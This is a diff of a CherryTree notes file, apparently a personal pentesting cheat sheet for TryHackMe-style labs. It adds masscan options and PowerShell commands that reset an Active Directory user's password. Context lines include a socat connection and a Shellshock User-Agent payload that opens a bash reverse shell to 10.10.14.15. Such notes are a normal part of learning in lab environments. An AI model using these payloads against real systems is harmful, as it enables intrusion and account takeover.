@@ -89,12 +89,12 @@ add the following to </rich_text>
     <rich_text>
 /hostshare /hostfiles 9p trans=virtio,version=9p2000.L,rw 0 0</rich_text>
   </node>
-  <node name="masscan" unique_id="112" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1668687808" ts_lastsave="1668688251">
+  <node name="masscan" unique_id="112" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1668687808" ts_lastsave="1668690089">
     <rich_text>-p- all port
 </rich_text>
     <rich_text weight="heavy">--banners</rich_text>
     <rich_text> get banners
- </rich_text>
+</rich_text>
     <rich_text weight="heavy">--rate</rich_text>
     <rich_text> </rich_text>
     <rich_text weight="heavy">&lt;packets-per-second&gt;</rich_text>
@@ -109,7 +109,11 @@ add the following to </rich_text>
            
 </rich_text>
     <rich_text weight="heavy">--open-only</rich_text>
-    <rich_text>: report only open ports, not closed ports.</rich_text>
+    <rich_text>: report only open ports, not closed ports.
+-sS : stealth scan
+</rich_text>
+    <rich_text weight="heavy">--retries</rich_text>
+    <rich_text>:  the number of retries to send, at 1 second intervals.</rich_text>
   </node>
   <node name="rpcclient" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1667389200" ts_lastsave="1667389265">
     <rich_text>querydominfo
@@ -371,7 +375,7 @@ Attacker:
       <rich_text family="monospace">socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</rich_text>
     </node>
   </node>
-  <node name="windows" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394181" ts_lastsave="1666013032">
+  <node name="windows" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394181" ts_lastsave="1673445436">
     <node name="cmd" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394591" ts_lastsave="1664800896">
       <rich_text>get hostname / pc name
 hostname
@@ -767,6 +771,26 @@ recurse ON
 prompt OFF
 mget *</rich_text>
     </node>
+  </node>
+  <node name="Active_Directory" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1673445436" ts_lastsave="1673445592">
+    <rich_text weight="heavy">Set new password to sophie</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#bac8d4">PS C:\Users\phillip&gt; Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose  
+
+New Password: *********  
+
+VERBOSE: Performing the operation "Set-ADAccountPassword" on target "CN=Sophie,OU=Sales,OU=THM,DC=thm,DC=local".</rich_text>
+    <rich_text>
+
+
+
+
+</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#bac8d4">PS C:\Users\phillip&gt; Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose  
+
+VERBOSE: Performing the operation "Set" on target "CN=Sophie,OU=Sales,OU=THM,DC=thm,DC=local".</rich_text>
   </node>
   <node name="shell" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663587498" ts_lastsave="1663587499">
     <rich_text family="monospace">User-Agent: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.15/443 0&gt;&amp;1</rich_text>
